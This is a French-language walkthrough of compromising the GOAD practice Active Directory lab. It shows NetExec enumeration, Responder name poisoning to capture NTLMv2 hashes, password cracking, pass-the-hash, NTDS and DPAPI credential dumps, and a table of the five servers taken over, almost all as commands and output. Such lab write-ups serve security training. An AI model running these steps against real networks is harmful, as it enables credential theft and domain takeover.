# GOAD-full

Énumération

**<span style="color: #dddddd;">🖥️</span> NetExec**

Énumération des machines

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24                                       
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)

```

&nbsp;

Énumération des utilisateurs

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 --users
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         192.168.56.11   445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         192.168.56.11   445    WINTERFELL       arya.stark                    2025-07-22 13:55:28 0       Arya Stark 
SMB         192.168.56.11   445    WINTERFELL       sansa.stark                   2025-07-22 13:56:04 0       Sansa Stark 
SMB         192.168.56.11   445    WINTERFELL       brandon.stark                 2025-07-22 13:56:12 0       Brandon Stark 
SMB         192.168.56.11   445    WINTERFELL       rickon.stark                  2025-07-22 13:56:21 0       Rickon Stark 
SMB         192.168.56.11   445    WINTERFELL       hodor                         2025-07-22 13:56:30 0       Brainless Giant 
SMB         192.168.56.11   445    WINTERFELL       jon.snow                      2025-07-22 13:56:38 0       Jon Snow 
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly                 2025-07-22 13:56:46 0       Samwell Tarly (Password : Heartsbane) 
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont                  2025-07-22 13:56:54 0       Jeor Mormont 
SMB         192.168.56.11   445    WINTERFELL       sql_svc                       2025-07-22 13:57:02 0       sql service 
SMB         192.168.56.11   445    WINTERFELL       [*] Enumerated 10 local users: NORTH

```

&nbsp;

Test du mot de passe trouver dans la description du compte `Samwell Tarly`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 -u samwell.tarly -p Heartsbane
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane (Guest)
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE

```

&nbsp;

**<span style="color: #dddddd;">🕵️</span> Responder**

Ayant laisser tourner `responder` il a pu récupéré des hash

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo responder -I enp0s8
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [enp0s8]
    Responder IP               [192.168.56.109]
    Responder IPv6             [fe80::d7a:61f7:8162:2457]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-8TN5LRYXL1F]
    Responder Domain Name      [JIBT.LOCAL]
    Responder DCE-RPC Port     [49323]

[+] Listening for events...

[*] [NBT-NS] Poisoned answer sent to 192.168.56.11 for name BRAVOS (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos
[*] [MDNS] Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos
[*] [MDNS] Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[SMB] NTLMv2-SSP Client   : 192.168.56.11
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:8b8b444cabb35585:F06CA9237B7828C5C977F7AEEFA57656:010100000000000000B5C0A2CCFBDB011586850DF61E851A00000000020008004A0049004200540001001E00570049004E002D00380054004E0035004C005200590058004C003100460004003400570049004E002D00380054004E0035004C005200590058004C00310046002E004A004900420054002E004C004F00430041004C00030014004A004900420054002E004C004F00430041004C00050014004A004900420054002E004C004F00430041004C000700080000B5C0A2CCFBDB0106000400020000000800300030000000000000000000000000300000D566AF207E85DFE5040CD5B04C3C08E6C7580165231064E6D8E38540610C328B0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
[*] [MDNS] Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::44a3:228f:e455:dd16 for name Bravos
[SMB] NTLMv2-SSP Client   : 192.168.56.11
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:efee801665baa030:5D5DDEB0C71DE846F8CB57E9F0076666:010100000000000000B5C0A2CCFBDB01E22BAD0ECC0DB37700000000020008004A0049004200540001001E00570049004E002D00380054004E0035004C005200590058004C003100460004003400570049004E002D00380054004E0035004C005200590058004C00310046002E004A004900420054002E004C004F00430041004C00030014004A004900420054002E004C004F00430041004C00050014004A004900420054002E004C004F00430041004C000700080000B5C0A2CCFBDB0106000400020000000800300030000000000000000000000000300000D566AF207E85DFE5040CD5B04C3C08E6C7580165231064E6D8E38540610C328B0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000

```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack des hash

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john hash.txt --wordlist=rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
sexywolfy        (robb.stark)     
1g 0:00:00:02 DONE (2025-07-23 19:00) 0.4608g/s 598326p/s 598326c/s 598326C/s sexyyella19..sexywalk41
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

┌──[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john hash.txt --show --format=netntlmv2
robb.stark:sexywolfy:NORTH:8b8b444cabb35585:F06CA9237B7828C5C977F7AEEFA57656:010100000000000000B5C0A2CCFBDB011586850DF61E851A00000000020008004A0049004200540001001E00570049004E002D00380054004E0035004C005200590058004C003100460004003400570049004E002D00380054004E0035004C005200590058004C00310046002E004A004900420054002E004C004F00430041004C00030014004A004900420054002E004C004F00430041004C00050014004A004900420054002E004C004F00430041004C000700080000B5C0A2CCFBDB0106000400020000000800300030000000000000000000000000300000D566AF207E85DFE5040CD5B04C3C08E6C7580165231064E6D8E38540610C328B0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000

1 password hash cracked, 0 left
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test du compte `robb.stark`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 -u robb.stark -p sexywolfy
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\robb.stark:sexywolfy 
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\robb.stark:sexywolfy STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\robb.stark:sexywolfy (Guest)
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\robb.stark:sexywolfy STATUS_LOGON_FAILURE
```

&nbsp;

Utilisateur `robb.stark` est admin du serveur 192.168.56.11 `WINTERFELL`, dump des user & hash

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.11 -u robb.stark -p sexywolfy --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.11   445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
SMB         192.168.56.11   445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.11   445    WINTERFELL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:812adb0619e08497030f0c20153b7604:::
SMB         192.168.56.11   445    WINTERFELL       vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.11   445    WINTERFELL       arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
SMB         192.168.56.11   445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
SMB         192.168.56.11   445    WINTERFELL       catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
SMB         192.168.56.11   445    WINTERFELL       robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
SMB         192.168.56.11   445    WINTERFELL       sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
SMB         192.168.56.11   445    WINTERFELL       brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
SMB         192.168.56.11   445    WINTERFELL       rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
SMB         192.168.56.11   445    WINTERFELL       hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
SMB         192.168.56.11   445    WINTERFELL       jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
SMB         192.168.56.11   445    WINTERFELL       sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         192.168.56.11   445    WINTERFELL       WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:6c0be1d4a76032008f11bce4a4731444:::
SMB         192.168.56.11   445    WINTERFELL       CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:641d0556a41bb66e0fcaf6457801f6a0:::
SMB         192.168.56.11   445    WINTERFELL       SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:4168d038d91d8e64d60f0bbe841e3cfb:::
```

&nbsp;

Test du compte `vagrant` avec sont hash

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb ip-goad.txt -u vagrant -H e02bc503339d51f71d913c245d35b50b
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\vagrant:e02bc503339d51f71d913c245d35b50b 
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\vagrant:e02bc503339d51f71d913c245d35b50b 
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
```

&nbsp;

Dump des user & hash du serveur 192.168.56.10 `KINGSLANDING`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 -u vagrant -H e02bc503339d51f71d913c245d35b50b --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.56.10   445    KINGSLANDING     [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.10   445    KINGSLANDING     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
SMB         192.168.56.10   445    KINGSLANDING     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.10   445    KINGSLANDING     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dbfd2707f884eaca3a1c9b0784c8b62f:::
SMB         192.168.56.10   445    KINGSLANDING     vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.10   445    KINGSLANDING     tywin.lannister:1114:aad3b435b51404eeaad3b435b51404ee:af52e9ec3471788111a6308abff2e9b7:::
SMB         192.168.56.10   445    KINGSLANDING     jaime.lannister:1115:aad3b435b51404eeaad3b435b51404ee:12e3795b7dedb3bb741f2e2869616080:::
SMB         192.168.56.10   445    KINGSLANDING     cersei.lannister:1116:aad3b435b51404eeaad3b435b51404ee:c247f62516b53893c7addcf8c349954b:::
SMB         192.168.56.10   445    KINGSLANDING     tyron.lannister:1117:aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998:::
SMB         192.168.56.10   445    KINGSLANDING     robert.baratheon:1118:aad3b435b51404eeaad3b435b51404ee:9029cf007326107eb1c519c84ea60dbe:::
SMB         192.168.56.10   445    KINGSLANDING     joffrey.baratheon:1119:aad3b435b51404eeaad3b435b51404ee:3b60abbc25770511334b3829866b08f1:::
SMB         192.168.56.10   445    KINGSLANDING     renly.baratheon:1120:aad3b435b51404eeaad3b435b51404ee:1e9ed4fc99088768eed631acfcd49bce:::
SMB         192.168.56.10   445    KINGSLANDING     stannis.baratheon:1121:aad3b435b51404eeaad3b435b51404ee:d75b9fdf23c0d9a6549cff9ed6e489cd:::
SMB         192.168.56.10   445    KINGSLANDING     petyer.baelish:1122:aad3b435b51404eeaad3b435b51404ee:6c439acfa121a821552568b086c8d210:::
SMB         192.168.56.10   445    KINGSLANDING     lord.varys:1123:aad3b435b51404eeaad3b435b51404ee:52ff2a79823d81d6a3f4f8261d7acc59:::
SMB         192.168.56.10   445    KINGSLANDING     maester.pycelle:1124:aad3b435b51404eeaad3b435b51404ee:9a2a96fa3ba6564e755e8d455c007952:::
SMB         192.168.56.10   445    KINGSLANDING     KINGSLANDING$:1001:aad3b435b51404eeaad3b435b51404ee:034172e732108b1cf698af518e696b2a:::
SMB         192.168.56.10   445    KINGSLANDING     NORTH$:1105:aad3b435b51404eeaad3b435b51404ee:4168d038d91d8e64d60f0bbe841e3cfb:::
SMB         192.168.56.10   445    KINGSLANDING     ESSOS$:1106:aad3b435b51404eeaad3b435b51404ee:510084608bf3b82563e2b9e17d3e7817:::
```

&nbsp;

Dump des user & hash du serveur 192.168.56.12 `MEEREEN`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 -u vagrant -H e02bc503339d51f71d913c245d35b50b --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.56.12   445    MEEREEN          [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.12   445    MEEREEN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
SMB         192.168.56.12   445    MEEREEN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.12   445    MEEREEN          krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a69bf8980e95ed2900f16462171f4db:::
SMB         192.168.56.12   445    MEEREEN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.12   445    MEEREEN          vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.12   445    MEEREEN          daenerys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
SMB         192.168.56.12   445    MEEREEN          viserys.targaryen:1114:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
SMB         192.168.56.12   445    MEEREEN          khal.drogo:1115:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
SMB         192.168.56.12   445    MEEREEN          jorah.mormont:1116:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
SMB         192.168.56.12   445    MEEREEN          missandei:1117:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
SMB         192.168.56.12   445    MEEREEN          drogon:1118:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
SMB         192.168.56.12   445    MEEREEN          sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         192.168.56.12   445    MEEREEN          MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:12f5723c1788011bb2622e29b6b37d97:::
SMB         192.168.56.12   445    MEEREEN          BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:6fccaa924a866b391cf87faa299ec168:::
SMB         192.168.56.12   445    MEEREEN          gmsaDragon$:1120:aad3b435b51404eeaad3b435b51404ee:9bb12d4f4843b7a08a25f0075d9bf88b:::
SMB         192.168.56.12   445    MEEREEN          SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:510084608bf3b82563e2b9e17d3e7817:::
```

&nbsp;

Test du compte Administrator du serveur 192.168.56.12 `MEEREEN` sur le serveur `BRAAVOS`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.23 -u Administrator -H 54296a48cd30259cc88095373cec24da
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\Administrator:54296a48cd30259cc88095373cec24da (Pwn3d!)
```

&nbsp;

Dump des identification DPAPI

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.11 -u robb.stark -p sexywolfy --dpapi
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
SMB         192.168.56.11   445    WINTERFELL       [+] Got 8 decrypted masterkeys. Looting secrets...
SMB         192.168.56.11   445    WINTERFELL       [robb.stark][CREDENTIAL] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{8F41145A-B97D-405F-BDD4-117CC8288DBA} - NORTH\eddard.stark:FightP3aceAndHonor!
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{48F7B0D2-7A98-4799-96D9-1F93BC73645F} - NORTH\robb.stark:sexywolfy
```

&nbsp;

Test du compte `eddard.stark`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc smb 192.168.56.1/24 -u eddard.stark -p FightP3aceAndHonor!
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\eddard.stark:FightP3aceAndHonor! (Pwn3d!)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\eddard.stark:FightP3aceAndHonor! (Pwn3d!)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\eddard.stark:FightP3aceAndHonor! STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\eddard.stark:FightP3aceAndHonor! (Guest)
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\eddard.stark:FightP3aceAndHonor! STATUS_LOGON_FAILURE
```

&nbsp;

**<span style="color: #dddddd;">📝</span> Synthèse**

Les 5 serveurs ont été compromis via des attaque par mouvement latéral

| Users:password | Admin | Serveur | IP  | Domaine |
| --- | --- | --- | --- | --- |
| vagrant:e02bc503339d51f71d913c245d35b50b | <span style="color: #dddddd;">✅</span> | KINGSLANDING | 192.168.56.10 | sevenkingdoms.local |
| robb.stark:sexywolfy | <span style="color: #dddddd;">✅</span> | WINTERFELL | 192.168.56.11 | north.sevenkingdoms.local |
| vagrant:e02bc503339d51f71d913c245d35b50b | <span style="color: #dddddd;">✅</span> | MEEREEN | 192.168.56.12 | essos.local |
| Administrator:54296a48cd30259cc88095373cec24da | <span style="color: #dddddd;">✅</span> | BRAAVOS | 192.168.56.23 | essos.local |
| eddard.stark:FightP3aceAndHonor! | <span style="color: #dddddd;">✅</span> | CASTELBLACK | 192.168.56.22 | north.sevenkingdoms.local |
